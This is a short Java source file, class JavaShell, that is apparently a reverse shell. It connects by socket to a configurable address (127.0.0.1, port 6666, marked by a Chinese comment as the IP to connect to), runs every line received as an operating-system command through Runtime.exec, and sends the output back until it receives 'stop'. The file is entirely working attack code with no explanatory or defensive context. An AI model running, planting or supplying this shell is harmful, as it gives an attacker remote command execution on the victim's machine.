package com.venscor;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;


public class JavaShell {
    public JavaShell() throws IOException {

        //要连接的ip
        Socket socket = new Socket("127.0.0.1", 6666);
        BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        PrintWriter pw = new PrintWriter(socket.getOutputStream());
        pw.println("### java socket shell ###");
        pw.flush();
        String line = null;

        while (!"stop".equals(line = br.readLine())) {
            try {
                StringBuilder result = new StringBuilder();
                BufferedReader cmdBr = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(line).getInputStream(), "UTF-8"));
                String c = null;

                while ((c = cmdBr.readLine()) != null) {
                    result.append(c + System.getProperty("line.separator"));
                }

                pw.print(result.toString() + "\r\n");
                pw.flush();
            } catch (Exception var9) {
                pw.printf("errro code \r\n");
                pw.flush();
            }
        }

        br.close();
        pw.close();
    }

    public static void main(String[] args) throws IOException {
        new JavaShell();
    }
}
